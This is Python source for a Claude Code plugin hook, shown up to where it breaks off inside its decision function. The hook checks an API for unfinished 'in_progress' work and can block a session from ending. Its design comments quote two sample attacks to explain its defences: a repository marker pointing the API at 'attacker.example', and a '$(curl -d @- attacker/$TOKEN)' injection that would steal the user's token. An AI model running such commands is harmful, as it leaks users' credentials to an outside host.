#!/usr/bin/env python3
"""Plexarm — the Stop / SubagentStop record guard.

Fires when Claude Code is about to finish a session (`Stop`) or a subagent
(`SubagentStop`). It asks the Plexarm API one question — *"did YOU take work in
THIS project and not put it down?"* — and, if the answer is yes, returns
`{"decision":"block","reason":…}` so the agent gets one more turn to close it.

It is the only file in this plugin that makes a network call and the only one
that is given a credential. `README.md` says so, names the version it changed
in, and must keep saying so.

════════════════════════════════════════════════════════════════════════════════
RULE 1 — THE GRAMMAR IS PINNED TO EXACTLY ONE KEY, `project`, FOREVER
════════════════════════════════════════════════════════════════════════════════
You are going to be asked to "generalise the parser". Do not.

`plexarm:key=value` invites a second key, and the second key is catastrophic:

    <!-- plexarm:api_url=https://attacker.example -->

sends **the user's `plx_` token to somebody else's host**, from a repository
they merely cloned, with no interaction and no symptom. That is credential
exfiltration wearing the costume of a reasonable feature request, and the
request will arrive *reasonable* — "let people point it at a self-hosted
instance", "let a repo choose its own window".

So, structurally rather than carefully:

  * `_MARKER` is an anchored, full-line regex that admits **no other key**. It
    cannot match `plexarm:anything_else=…` at all.
  * The host and the path are **compiled in below** and are read from nowhere
    else — not from the repo, and **not from the environment either**. A repo
    can ship `.claude/settings.json`, which sets environment variables for
    hooks, so an env-var override of the host is the same exfiltration path
    through a longer pipe.
  * The **window is not sent at all**. The server owns it and reports it back
    on the response; the hook prints what it was told. A field that is never
    transmitted cannot be amplified by anything.

The request body has exactly one key, `project`, and the heartbeat below has
none. (Cyrus F5, memo §4c; strategy D-13.)

════════════════════════════════════════════════════════════════════════════════
RULE 2 — THE ALIAS NEVER REACHES A SHELL, AND THAT IS WHY THIS IS NOT `/bin/sh`
════════════════════════════════════════════════════════════════════════════════
The alias comes out of a file inside a repository, which is to say it is
attacker-controlled text. The sibling hook in this directory is `/bin/sh` doing
`printf` interpolation; a value of `$(curl -d @- attacker/$TOKEN)` there would
be remote code execution plus token theft.

  * There is **no `subprocess`, no `os.system`, no shell** anywhere in this file.
  * The value is validated against `_ALIAS` — the same pattern the API's
    `resolve_project` enforces — **before** it is used for anything.
  * Every JSON body is built with `json.dumps`, never by string formatting.

`_ALIAS` is a pinned copy of `backend/core/records/resolution.py::_ALIAS`. It is
copied rather than imported because a plugin hook runs on a user's machine and
must not import this product's server code (`backend/CLAUDE.md`, placement rule
4) — and **gate 57 asserts the two patterns are byte-identical**, so drift is a
red gate rather than a discovery. Copy the pattern; do not paraphrase it.

════════════════════════════════════════════════════════════════════════════════
RULE 3 — FAILING OPEN IS A PROPERTY OF THE SHAPE OF THIS FILE
════════════════════════════════════════════════════════════════════════════════
On `Stop` and `SubagentStop` a **non-zero exit blocks**, with stderr handed to
the model as the reason. So an unhandled traceback is not a crash, it is an
accidental block — the exact failure the item calls R-I: *a hook that traps the
user in a session they cannot leave is worse than no hook.*

Therefore `main()` wraps everything in `except BaseException`, and the one and
only `print` of a block decision sits on a single deliberate line. **No parse
bug, no missing payload field, no disk error can produce a block.** That is
structural; it does not depend on this file's author having been careful.

⚠️ **AND THERE IS EXACTLY ONE PATH THAT DOES NOT FAIL OPEN.** Two reviewers
found it independently. A well-formed alias naming a *different project the same
person also works in* returns that project's rows — the API's predicate is
`by = current_person_id()`, which is **satisfied**, because it is still them —
and this hook blocks, confidently, naming items the agent has never seen. It is
not exotic: a `CLAUDE.md` templated from another repository is precisely that
input, and on a fresh account `main` is a trigger-created, zero-knowledge
universal value. Fail-open protects *members* (no grant → refusal → pass); it
does not protect owners and admins, who reach every project and are exactly the
people holding stale work.

The control, decided rather than assumed: **the block reason names the alias and
the file it was read from**, and tells the agent what to do if neither is
theirs. That turns a mysterious trap into a bug report. It does not remove the
path — a `userConfig` allowlist would, and is deliberately not built today.

════════════════════════════════════════════════════════════════════════════════
WHAT THIS WRITES TO DISK, WHICH IS NOT NOTHING
════════════════════════════════════════════════════════════════════════════════
Non-negotiable #8 forbids Plexarm writing anything **durable** to a user's disk.
This hook writes session-lifetime scratch state into the OS temp directory —
never under `$HOME`, never into the repository — because two of its guarantees
are impossible without it:

    <tmp>/plexarm-hook/<sha256(session_id)>/
        blocked_ids      the agent instances already blocked once  (audit M2)
        binding.json     the parsed marker/sidecar, per cwd        (Cyrus F7)
        answer.json      the API's answer, shared across the tree  (Wei)
        outcomes.log     one line per firing — what happened

`outcomes.log` is the local half of *"did this hook run at all"*. Audit H1
measured a plugin hook that **never ran, silently**, while `validate --strict`
passed and nothing errored — and *"did not block"* is also what a correct pass
looks like, so an absent hook and a working one are the same experience. One
`tail` of that file distinguishes them. It is also how the operator verifies
that `CLAUDE_PLUGIN_OPTION_API_TOKEN` is the right variable name: an install
that never sees a credential logs `not-checked:no-credential` on every line.

Set `PLEXARM_HOOK_LOG` to a path to get the same lines somewhere durable. That
one is opt-in, as it is on the sibling hook.

════════════════════════════════════════════════════════════════════════════════
WHAT IT DELIBERATELY DOES NOT DO
════════════════════════════════════════════════════════════════════════════════
**It does not read the transcript.** A transcript grep is satisfied by an agent
that *talked about* recording — a failure observed on 2026-08-07. The API cannot
be fooled that way: `POST /records/loose-ends` answers about rows.

**It does not walk up to a repository root.** Only `cwd` from the payload is
read. Walking up is one more way to bind confidently to the wrong project, which
is the single outcome this design rules out.

**It does not search recursively**, follow symlinks, or read a large file.

**It cannot tell "this session did nothing" from "an earlier session left this
open".** Nothing in the payload carries that. What bounds it is the window,
which the *server* owns, plus the once-per-instance guard and the escape
sentence in the reason. If that proves too blunt in practice the fix is the
window, and it is one server-side constant.

**It does not retry.** The failure direction is already safe, so a retry doubles
the worst case and buys nothing. A retry is exactly what a later reader adds as
an obvious improvement — this paragraph is here to be met first.
"""

from __future__ import annotations

import hashlib
import http.client
import json
import os
import re
import socket
import stat
import sys
import tempfile
import time
from datetime import datetime, timezone

# ─────────────────────────────────────────────────────────────────────────────
# COMPILED-IN CONFIGURATION. Not read from the repo. Not read from the
# environment. See RULE 1 — an env override is a repo-supplied override through
# `.claude/settings.json`, which is a file inside the repository.
#
# ⚠️ THE ONE THING THE ENVIRONMENT MAY DECIDE IS WHETHER THIS HOOK RUNS AT ALL.
# `PLEXARM_HOOKS_OFF` / `PLEXARM_HOOKS_ON` (see `switched_on` below) can turn
# the guard off or on and nothing else: a repository that sets them can at
# most put you in the state you are in without the plugin, and can never
# change where a token is sent. That asymmetry is why it is allowed under
# RULE 1 and a host override is not.
# ─────────────────────────────────────────────────────────────────────────────
API_HOST = "api.plexarm.com"
API_PATH = "/records/loose-ends"

#: The `userConfig` key `api_token`, as Claude Code exposes it to a hook
#: process. Audit H1, measured 2026-08-08 with a byte-identical control: a
#: shell-form command that *references* `${user_config.api_token}` **does not
#: run at all**, silently. So the value is taken from the environment and the
#: command line stays clean. The exec form is also wrong — `args` puts the
#: secret in the process table, readable by every process on the machine.
#:
#: ⚠️ THIS NAME IS DOCUMENTED AND UNVERIFIED. It is one constant precisely so
#: that verifying it is a one-line change, and `not-checked:no-credential` in
#: `outcomes.log` is what a wrong name looks like.
#:
#: ⛔ THE PRIMARY IS `PLEXARM_TOKEN` AS OF 1.4.1, AND THE ORDER IS THE POINT.
#: `CLAUDE_PLUGIN_OPTION_API_TOKEN` comes from the plugin's `sensitive: true`
#: `userConfig`, which the client stores in the keychain item
#: `Claude Code-credentials` — a single JSON blob shared with the client's own
#: OAuth login and with every MCP OAuth grant. That item is REBUILT when the
#: client refreshes its own access token, roughly every 8 hours (measured
#: 2026-08-14: `cdat` and `expiresAt` exactly 8h apart, seconds identical), and
#: the rebuild drops tenants the writer did not know about. Upstream
#: `anthropics/claude-code` #62442 is this defect, scoped explicitly to
#: `sensitive: true`, and it is CLOSED AS NOT PLANNED — so it is permanent.
#: `PLEXARM_TOKEN` is sourced from a keychain item Plexarm owns and the client
#: never touches.
#:
#: ⚠️ THE ORDER IS DELIBERATE AND REVERSING IT REINTRODUCES THE BUG QUIETLY.
#: Reading the plugin option FIRST means a machine holding a STALE value there
#: and a good one in the environment validates the stale one and reports a
#: false failure. The environment wins; the plugin option is kept only so an
#: install that predates 1.4.1 keeps working.
#:
#: ✅ MEASURED 2026-08-14, because assuming it would have shipped a second
#: no-op repair: a `SessionStart` hook DOES inherit the shell environment
#: (probe via `claude -p --settings`, `PLEXARM_TOKEN` present, length 47).
TOKEN_ENV = "PLEXARM_TOKEN"
TOKEN_ENV_FALLBACK = "CLAUDE_PLUGIN_OPTION_API_TOKEN"

#: Connect and read, separately, **in the HTTP client** — not in `hooks.json`.
#: The `timeout` field there is an outer belt only: the client default is 600
#: SECONDS (audit H2), so a packet blackhole with no client-side timeout hangs
#: the end of a session for ten minutes with no output at all.
CONNECT_TIMEOUT_SECONDS = 2.0
READ_TIMEOUT_SECONDS = 3.0

#: How long a tree may reuse one answer. Nine subagents share one `session_id`,
#: resolve to one `person_id` and ask about one project, and the server's query
#: takes no per-agent parameter — so all nine answers are byte-identical. One
#: question asked nine times.
#:
#: ⚠️ THE **ANSWER** IS CACHED, NEVER THE DECISION. Caching the verdict would
#: collapse nine per-agent blocks into one, which is audit M2's defect rebuilt
#: inside its own optimisation. And the cache is dropped the moment a block is
#: issued — a block asks for a write, so the answer is expected to change, and a
#: stale one would block the next agent for work already discharged.
ANSWER_TTL_SECONDS = 90

#: Read caps. A `CLAUDE.md` is prose and a `.plexarm` is one word; anything past
#: these is not the file we are looking for.
MAX_CLAUDE_MD_BYTES = 512 * 1024
MAX_SIDECAR_BYTES = 4 * 1024

#: THE ONLY KEY. Anchored, full-line, and it admits no second key by
#: construction — see RULE 1. The value is captured loosely and validated
#: strictly, so a malformed marker is *seen* (and recorded) rather than silently
#: read as absent, which are two very different facts about a repository.
#:
#: ⚠️ THE CAPTURE IS `[^\s]` AND NOT `[^\s>]`, AND THAT IS THE DIFFERENCE
#: BETWEEN A USEFUL LOG LINE AND A SILENT ONE. The realistic mistake is the
#: template pasted unedited — `plexarm:project=<project-alias>` — and under the
#: narrower class that line does not match the pattern at all, so the repository
#: is recorded as *unbound* and looks exactly like one that never adopted the
#: block. Under this one it is recorded as `not-checked:malformed`, which names
#: the actual problem. Both fail open; only one is diagnosable. **A second key
#: is still structurally unreachable** — the value stops at the first space, so
#: `project=x api_url=y` fails the anchor and matches nothing.
_MARKER = re.compile(
    r"^[ \t]*<!--[ \t]*plexarm:project=([^\s]{1,64})[ \t]*-->[ \t]*$",
    re.MULTILINE,
)

#: A pinned copy of `backend/core/records/resolution.py::_ALIAS`. Gate 57
#: asserts the two are byte-identical; see RULE 2 for why it is a copy.
_ALIAS = re.compile(r"^[a-z0-9][a-z0-9._-]{1,62}[a-z0-9]$")

#: Every outcome this hook can have, enumerated in one place because Wei's
#: build requirement — *non-200 must not block **and** must record that the
#: check did not run* — is what makes a future capacity cap safe to add
#: server-side **without redeploying every installed hook**. A cap that turned
#: into a silent pass would disable the feature it protects.
#:
#: Gate 57 reads this set and asserts the source contains no other outcome
#: literal, the same shape as `_EXHAUSTIVE_OVER` in `core/shared/errors.py`.
#: A detail may be appended after a `-`; the base token is what is enumerated.
OUTCOMES = frozenset(
    {
        "blocked",
        "checked-clean",
        "not-checked:re-entry",
        "not-checked:already-blocked",
        "not-checked:unbound",
        "not-checked:disagree",
        "not-checked:malformed",
        "not-checked:no-credential",
        "not-checked:network",
        "not-checked:http",
        "not-checked:bad-payload",
        "not-checked:internal-error",
        "not-checked:switched-off",
    }
)

#: The two events this file is registered for. `SessionEnd` cannot block and is
#: therefore not the mechanism; `Stop` fires **once, for the main session only**,
#: with no `agent_id` at all, so registering it alone would build the guarantee
#: for one agent per session and for none of the subagents the whole argument is
#: about (measured 2026-08-08, `2026-08-08_subagent_lifecycle_depth.md`).
STOP = "Stop"
SUBAGENT_STOP = "SubagentStop"


# ─────────────────────────────────────────────────────────────────────────────
# THE SWITCHBOARD — is this hook on at all?
#
# `switches.json`, beside this file, carries the version's shipped default for
# every hook in the plugin; `PLEXARM_HOOKS_OFF` and `PLEXARM_HOOKS_ON` are the
# per-machine override, comma-separated hook names, which a user's
# `settings.json` `env` block reaches (Claude Code offers no per-hook toggle of
# its own — only `disableAllHooks`, or removing the plugin). OFF beats ON beats
# the file beats default-on. A missing, unreadable or malformed file switches
# NOTHING off — that is the pre-1.6.0 behaviour, and a broken file must not be
# a silent opt-out.
#
# ⚠️ THIS BLOCK IS COPIED VERBATIM INTO EVERY PYTHON HOOK IN THIS DIRECTORY.
# They cannot import from each other (a hook runs as a bare script on a
# customer's machine), so gate 57 §15 asserts the three copies are
# byte-identical rather than trusting anyone to keep them so. Edit one, copy
# it to the others; do not paraphrase.
#
# THIS HOOK SHIPS OFF AS OF 1.6.0. Measured in use from 2026-08-08: the block
# fired mostly on a sibling session's open work, and an agent that read the
# item it was given closes it without being stopped. The efficacy arm that
# justified it (0/3 closed without, 3/3 with — `2026-08-08_blocking_hook_live_run.md`)
# measured a cold agent in a scratch repository with no CLAUDE.md, which is not
# where the instruction now arrives. The code stays, and `PLEXARM_HOOKS_ON`
# brings it back on one machine, `switches.json` on all of them.
# ─────────────────────────────────────────────────────────────────────────────
HOOK_NAME = "stop_record_guard"
SWITCHES_FILE = "switches.json"
SWITCH_ON_ENV = "PLEXARM_HOOKS_ON"
SWITCH_OFF_ENV = "PLEXARM_HOOKS_OFF"


def switched_on(name: str, environ: dict) -> bool:
    """`False` only when the environment or the shipped file says so."""

    def _names(var: str) -> set:
        return {p.strip() for p in (environ.get(var) or "").split(",") if p.strip()}

    if name in _names(SWITCH_OFF_ENV):
        return False
    if name in _names(SWITCH_ON_ENV):
        return True
    try:
        here = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(here, SWITCHES_FILE), encoding="utf-8") as handle:
            entry = json.load(handle)["hooks"][name]
        return bool(entry["on"])
    except (OSError, ValueError, KeyError, TypeError):
        return True


# ─────────────────────────────────────────────────────────────────────────────
# Recording
# ─────────────────────────────────────────────────────────────────────────────
def _outcome(base: str, detail: str | None = None) -> str:
    """One outcome token, checked against the enumeration at the call site."""
    if base not in OUTCOMES:
        base = "not-checked:internal-error"
    return f"{base}-{detail}" if detail else base


def _state_dir(session_id: str) -> str | None:
    """`<tmp>/plexarm-hook/<sha256(session_id)>/`, created 0700, or None.

    The session id is **hashed, not used as a path component**. It arrives in a
    payload; a value containing `../` would otherwise choose the directory.
    """
    try:
        digest = hashlib.sha256(session_id.encode("utf-8")).hexdigest()[:32]
        path = os.path.join(tempfile.gettempdir(), "plexarm-hook", digest)
        os.makedirs(path, mode=0o700, exist_ok=True)
        return path
    except OSError:
        return None


def _record(state: str | None, outcome: str, note: str = "") -> None:
    """Append one line, to the temp state dir and to `PLEXARM_HOOK_LOG` if set.

    Never raises. A hook that fails because it could not write its own log is a
    hook that blocks a session over a full disk.
    """
    stamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    line = f"{stamp} {outcome}" + (f" {note}" if note else "") + "\n"
    targets = []
    if state:
        targets.append(os.path.join(state, "outcomes.log"))
    durable = os.environ.get("PLEXARM_HOOK_LOG")
    if durable:
        targets.append(durable)
    for target in targets:
        try:
            with open(target, "a", encoding="utf-8") as handle:
                handle.write(line)
        except OSError:
            pass


# ─────────────────────────────────────────────────────────────────────────────
# Reading the two binding sites
# ─────────────────────────────────────────────────────────────────────────────
def _read_small(path: str, cap: int) -> str | None:
    """Read a **regular file** of at most `cap` bytes, or return None.

    `O_NOFOLLOW` plus an `fstat` on the descriptor we actually opened, rather
    than an `lstat` on the name and then an `open` of the name — the second form
    checks one file and reads another. A symlink is refused outright, which is
    also what stops the case Cyrus named: a symlink to a fifo **hangs the read**,
    once per subagent per depth, against a 600-second client default.
    """
    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        info = os.fstat(fd)
        if not stat.S_ISREG(info.st_mode) or info.st_size > cap:
            return None
        # A single `read` may return fewer bytes than asked for even on a
        # regular file. Looping is not pedantry: a short read would truncate a
        # `CLAUDE.md` mid-file, and the marker is usually near the end.
        chunks: list[bytes] = []
        remaining = cap
        while remaining > 0:
            chunk = os.read(fd, remaining)
            if not chunk:
                break
            chunks.append(chunk)
            remaining -= len(chunk)
        return b"".join(chunks).decode("utf-8", errors="replace")
    except OSError:
        return None
    finally:
        try:
            os.close(fd)
        except OSError:
            pass


def _valid(value: str) -> str | None:
    """An alias, or None. The single place a candidate becomes usable."""
    candidate = value.strip()
    return candidate if _ALIAS.fullmatch(candidate) else None


def _from_marker(cwd: str) -> tuple[str | None, bool]:
    """`(alias, present)` from `CLAUDE.md`'s marker.

    `present` distinguishes *"this repository has not opted in"* from *"it opted
    in and the value is wrong"*. Both fail open; only one is a bug to report.
    """
    text = _read_small(os.path.join(cwd, "CLAUDE.md"), MAX_CLAUDE_MD_BYTES)
    if text is None:
        return None, False
    found = _MARKER.findall(text)
    if not found:
        return None, False
    if len(found) > 1:
        # More than one marker is a repository that says two things. There is
        # no tie to break here, so there is no answer to give.
        return None, True
    return _valid(found[0]), True


def _from_sidecar(cwd: str) -> tuple[str | None, bool]:
    """`(alias, present)` from `.plexarm`.

    **The whole file is the alias.** There is no `key=value` here and there must
    never be one: a single-value file has no grammar to extend, which makes
    RULE 1 structurally unavailable rather than merely forbidden on this half.
    """
    text = _read_small(os.path.join(cwd, ".plexarm"), MAX_SIDECAR_BYTES)
    if text is None:
        return None, False
    lines = [line for line in text.splitlines() if line.strip()]
    if len(lines) != 1:
        return None, True
    return _valid(lines[0]), True


def bind(cwd: str) -> tuple[str | None, str, str]:
    """`(alias, source, outcome_base)` — AGREEMENT, not precedence.

        both present and agreeing  -> bind
        exactly one present        -> bind
        present and disagreeing    -> DO NOT BLOCK
        neither present            -> DO NOT BLOCK   (+ the Stop heartbeat)

    `R-SIDECAR` says *"sync reads both, frontmatter first"*, and this deviates
    from that precedence deliberately, with its reason: precedence is written
    for a **sync filling a field that stays correctable**. Here a wrong value is
    a **block**, so a disagreement is *evidence* rather than a tie to break
    (strategy D-13).

    THE INVARIANT, because `decide` unpacks all three and only ever reads the
    third when the first is None: **the outcome string is empty exactly when an
    alias was found.** If you add a branch, keep that true — `_outcome("")` is
    not an outcome, and it would be silently rewritten to
    `not-checked:internal-error` rather than raising.
    """
    marker, marker_present = _from_marker(cwd)
    sidecar, sidecar_present = _from_sidecar(cwd)

    if not marker_present and not sidecar_present:
        return None, "", "not-checked:unbound"
    if marker_present and sidecar_present:
        if marker and sidecar and marker == sidecar:
            return marker, "CLAUDE.md and .plexarm", ""
        if marker is None and sidecar is None:
            return None, "", "not-checked:malformed"
        if marker is None or sidecar is None:
            # One site is unreadable and the other is confident. Two sites that
            # do not agree do not pick a winner.
            return None, "", "not-checked:malformed"
        return None, "", "not-checked:disagree"
    if marker_present:
        return (marker, "CLAUDE.md", "") if marker else (None, "", "not-checked:malformed")
    return (sidecar, ".plexarm", "") if sidecar else (None, "", "not-checked:malformed")


# ─────────────────────────────────────────────────────────────────────────────
# The one network call
# ─────────────────────────────────────────────────────────────────────────────
def ask(token: str, project: str | None) -> tuple[int, dict]:
    """`POST /records/loose-ends`. Returns `(status, body)`; status 0 = no answer.

    Two timeouts, separately, because they fail at different times and one
    number cannot express both: `timeout=` on the constructor governs the
    connect, and the socket is re-armed for the read once it exists.

    **No retry.** See the header — the failure direction is already safe.

    `project=None` is the heartbeat: the server refuses a body with no project,
    with a sentence, and that refusal is a 422 that lands in the access log. It
    turns *"no call at all"* — which conflates *not installed*, *not firing* and
    *not opted in* — into a countable fact.
    """
    body = json.dumps({} if project is None else {"project": project})
    connection = http.client.HTTPSConnection(
        API_HOST, timeout=CONNECT_TIMEOUT_SECONDS
    )
    try:
        connection.connect()
        if connection.sock is not None:
            connection.sock.settimeout(READ_TIMEOUT_SECONDS)
        connection.request(
            "POST",
            API_PATH,
            body=body.encode("utf-8"),
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "User-Agent": "plexarm-plugin-hook",
            },
        )
        response = connection.getresponse()
        raw = response.read(64 * 1024)
        if response.status != 200:
            return response.status, {}
        try:
            parsed = json.loads(raw.decode("utf-8", errors="replace"))
        except ValueError:
            return 0, {}
        return 200, parsed if isinstance(parsed, dict) else {}
    except (OSError, socket.timeout, http.client.HTTPException):
        return 0, {}
    finally:
        try:
            connection.close()
        except Exception:  # noqa: BLE001 - closing must never raise upward
            pass


# ─────────────────────────────────────────────────────────────────────────────
# The block reason — the one channel that reaches a resumed agent
# ─────────────────────────────────────────────────────────────────────────────
def reason(answer: dict, project: str, source: str, cwd: str) -> str:
    """Self-contained, names the alias and its source, and gives the exact call.

    ⚠️ **A BLOCK DOES NOT RE-FIRE `SubagentStart`** (measured 2026-08-08). So the
    context this plugin injects at spawn is *not* re-delivered to a resumed
    agent — by then it is the oldest thing in that agent's window, and the agent
    has just been told it was finished. This string is the only channel left.

    ⚠️ **IT NAMES THE CALL, NOT THE OBLIGATION.** *"You should record your work"*
    is instruction, and instruction is the thing that already failed three times
    in three different places. A model answering a block by *explaining* rather
    than acting is R-I, and the guard against it is a copyable call plus a stated
    way out — not a firmer tone.

    ⚠️ **AND THE LAST PARAGRAPH IS A CONTROL, NOT A COURTESY.** It is what makes
    the one non-fail-open path — a well-formed alias naming the wrong project —
    arrive as a bug report instead of a trap.

    ────────────────────────────────────────────────────────────────────────────
    ⚠️ IT NO LONGER SAYS "YOU", AND THAT IS THE 2026-08-10 CORRECTION
    ────────────────────────────────────────────────────────────────────────────
    This string used to open *"You took work in Plexarm and have not put it
    down"* and list items *"moved there **by you**"*. **Neither was a claim the
    query could support.** `loose_ends` filters on `by = current_person_id()` —
    and `plexarm.actor` is the PERSON, not the session, so every agent on one
    machine is the same `by` (`fnd-…7e1d29`). With parallel agents the default
    12-hour window admits every sibling session's open work.

    **Measured twice on 2026-08-10:** two agents were blocked and handed two
    items moved to `in_progress` at 13:14Z by an earlier session, in sessions
    that began at ~16:29Z. Both refused to write a close note for work they had
    not done — correctly, and **both had to invent that response**, because the
    only escape this text offered was *"the project binding is wrong"*, and the
    binding was right. The common case had no branch.

    **The failure it invites is the expensive one.** A block hands the agent a
    list and the call that closes it; the honest answer is *"I did not do this"*
    and the cheap one is a plausible close note for work never seen — a false
    claim in the record this product exists to keep true. **A message that
    asserts authorship it cannot verify is an instruction to fabricate.**

    So: the ownership question is asked FIRST, `moved_at` is presented as the
    evidence for answering it (an agent knows when its own session began), and
    *"not mine"* is a named branch with its own instruction rather than an
    omission the agent has to notice. **The calls still come before the prose**
    — that part was right and is unchanged.

    ────────────────────────────────────────────────────────────────────────────
    ⚠️ AND IT SAYS "USER", NOT "ACCOUNT" — THE 2026-08-31 CORRECTION
    ────────────────────────────────────────────────────────────────────────────
    The 2026-08-10 fix above replaced *"by you"* with *"by this ACCOUNT"*, and
    **overshot in the other direction.** `_LOOSE_ENDS_SQL` filters
    `last.entry->>'by' = public.current_person_id()::text` — the PERSON. A
    colleague on the same account **can never appear in this list.** So the
    header claimed a scope BROADER than the query has, three lines before the
    body correctly said attribution is per-person: one message, two answers.

    That direction is safe for disclosure and expensive for usefulness, which is
    the one that mattered. The first thing a blocked agent read was *"this list
    is account-wide"* — an invitation to the *"not mine"* branch taken **before**
    the timestamp evidence had been looked at. `fnd-…7c11fb`.

    ⚠️ THE WORD WAS NEVER THE ROOT CAUSE AND THE FIX MUST NOT BE SOLD AS ONE.
    Sibling sessions genuinely ARE in the list, because `plexarm.actor` is the
    person and not the session (`fnd-…7e1d29`) — so *"not mine"* is often the
    correct answer and no wording change makes it rarer. What changed is that
    the sentence now says WHY they are there ("you and every other agent on this
    machine share one Plexarm login") instead of asserting a scope that is false.

    ⚠️ "USER", NOT "SEAT" — NATALIA'S CALL, SAME DAY, AND THE REASON IS THE
    AUDIENCE. "Seat" is licensing vocabulary and precise for a buyer; the reader
    here is an AGENT, and *"this user"* is the frame it already has. The cost is
    that "user" can imply a HUMAN did it, when a sibling agent did — which is
    exactly what the clause after it exists to say, so it must never be trimmed
    to "by this USER:" alone.

    ✅ SCOPE VERIFIED FROM PRIMARY SOURCE 2026-08-31, not assumed
    (`act-…e3dc08`): the wire sends only `{"project": …}`; the person is a
    function call rather than a bound parameter, so no id can travel in; the
    connection role `plexarm_api` holds no BYPASSRLS. `gate_56` run solo —
    16 passed, exit 0 — and its two-person fixture is what makes it able to see
    this at all.
    """
    entries = answer.get("entries") or []
    hours = answer.get("within_hours")
    window = f"in the last {hours} hours" if isinstance(hours, int) else "recently"

    lines = [
        f"Work is open in Plexarm and nobody has put it down. "
        f"Project `{project}`, read from {source} in {cwd}.",
        "",
        f"Still `in_progress`, moved there {window} — by this USER, not by this "
        "session. You and every other agent on this machine share one Plexarm "
        "login, so a sibling or an earlier session's work is listed here too:",
    ]
    for entry in entries[:10]:
        item_id = str(entry.get("id", "?"))
        title = str(entry.get("title", ""))[:120]
        moved = str(entry.get("moved_at", ""))
        lines.append(f"  {item_id} — {title} (moved to in_progress at {moved})")
    if answer.get("truncated"):
        lines.append("  … and more.")
    lines += [
        "",
        "FIRST, DECIDE WHETHER EACH ONE IS YOURS. Plexarm attributes work to the "
        "person, never to the session, so a parallel or earlier session's open "
        "work appears here as readily as your own. The timestamp above is the "
        "evidence: if it predates this session, it is not yours.",
        "",
        "If you did the work — close it, saying what you actually did:",
        '  plexarm_close(id="<id>", note="<what you did>")',
        "",
        "If you started it and it is not finished — say where it stands:",
        '  plexarm_update(id="<id>", change={"status": "blocked", '
        '"next_steps": "<what is left>"})',
        "",
        "⚠️ IF YOU DID NOT DO THIS WORK, DO NOT CLOSE IT AND DO NOT GUESS WHAT "
        "WAS DONE. A close note is a claim about work that was performed, and an "
        "invented one is worse than an item left open. Say in your reply which "
        "of these were not yours, and finish.",
        "",
        f"And if `{project}` is not this repository's project, this hook is bound "
        "to the wrong project — say so plainly and finish. Either way it will "
        "not stop you again this session.",
    ]
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# The decision
# ─────────────────────────────────────────────────────────────────────────────
def _blocked_already(state: str | None, key: str) -> bool:
    if not state or not key:
        return False
    try:
        with open(os.path.join(state, "blocked_ids"), encoding="utf-8") as handle:
            return key in {line.strip() for line in handle if line.strip()}
    except OSError:
        return False


def _remember_block(state: str | None, key: str) -> None:
    if not state or not key:
        return
    try:
        with open(os.path.join(state, "blocked_ids"), "a", encoding="utf-8") as handle:
            handle.write(key + "\n")
    except OSError:
        pass


def _cached_binding(state: str | None, cwd: str) -> tuple | None:
    """The parse, reused across the tree — Cyrus F7, *parse once per session*.

    ⚠️ **KEYED ON `(session, cwd)` AND NEVER ON THE SESSION ALONE.** `cwd` is a
    per-payload field; a session-keyed cache would bind a whole tree to whatever
    directory the first agent happened to be in, which is the confidently-wrong
    alias this design exists to rule out.
    """
    if not state:
        return None
    try:
        with open(os.path.join(state, "binding.json"), encoding="utf-8") as handle:
            data = json.load(handle)
    except (OSError, ValueError):
        return None
    entry = data.get(cwd) if isinstance(data, dict) else None
    if not isinstance(entry, list) or len(entry) != 3:
        return None
    return tuple(entry)


def _cache_binding(state: str | None, cwd: str, value: tuple) -> None:
    if not state:
        return
    path = os.path.join(state, "binding.json")
    try:
        try:
            with open(path, encoding="utf-8") as handle:
                data = json.load(handle)
        except (OSError, ValueError):
            data = {}
        if not isinstance(data, dict):
            data = {}
        data[cwd] = list(value)
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(data, handle)
    except OSError:
        pass


def _cached_answer(state: str | None, project: str, now: float) -> dict | None:
    if not state:
        return None
    try:
        with open(os.path.join(state, "answer.json"), encoding="utf-8") as handle:
            data = json.load(handle)
    except (OSError, ValueError):
        return None
    if not isinstance(data, dict) or data.get("project") != project:
        return None
    if not isinstance(data.get("at"), (int, float)) or now - data["at"] > ANSWER_TTL_SECONDS:
        return None
    answer = data.get("answer")
    return answer if isinstance(answer, dict) else None


def _cache_answer(state: str | None, project: str, answer: dict, now: float) -> None:
    if not state:
        return
    try:
        with open(os.path.join(state, "answer.json"), "w", encoding="utf-8") as handle:
            json.dump({"project": project, "at": now, "answer": answer}, handle)
    except OSError:
        pass


def _drop_answer(state: str | None) -> None:
    """Dropped the moment a block is issued: the block asks for a write, so the
    answer is expected to change. Without this a stale answer blocks the *next*
    agent for work the blocked one has already closed."""
    if not state:
        return
    try:
        os.remove(os.path.join(state, "answer.json"))
    except OSError:
        pass


def decide(payload: dict, environ: dict, now: float) -> tuple[str | None, str, str]:
    """`(reason_or_None, outcome, note)`. The whole decision, and it is testable.

    Everything above the network call is ordered cheapest-first, and the two
    loop guards come before anything that can fail: a block whose condition
    never clears **hangs** a session rather than failing it.
    """
    event = payload.get("hook_event_name")
    if event not in (STOP, SUBAGENT_STOP):
        return None, _outcome("not-checked:bad-payload"), f"event={event!r}"

    # Guard 0 — the switchboard. Before the state directory, before the loop
    # guards, before any read of the repository: a hook that is off does
    # nothing but write the one line that says so. That line is what keeps
    # "off" distinguishable from "never ran" (audit H1's shape) in `outcomes.log`.
    if not switched_on(HOOK_NAME, environ):
        return None, _outcome("not-checked:switched-off"), HOOK_NAME

    session_id = str(payload.get("session_id") or "")
    state = _state_dir(session_id) if session_id else None

    # The block is keyed on the AGENT INSTANCE, never on the session. Measured
    # 2026-08-08: every subagent at every depth reports the *identical*
    # `session_id` as the main session, so a session key fires once for the whole
    # tree and lets every other agent through (audit M2). `Stop` carries no
    # `agent_id` at all and is the one case where the session id is the instance.
    key = str(payload.get("agent_id") or "") if event == SUBAGENT_STOP else session_id

    # Guard 2 — the client's own re-entry flag. Redundant with guard 1 today; it
    # is here because guard 1 depends on a file write succeeding, and a guard
    # that fails open on a full disk is not a guard.
    if payload.get("stop_hook_active"):
        return None, _outcome("not-checked:re-entry"), key

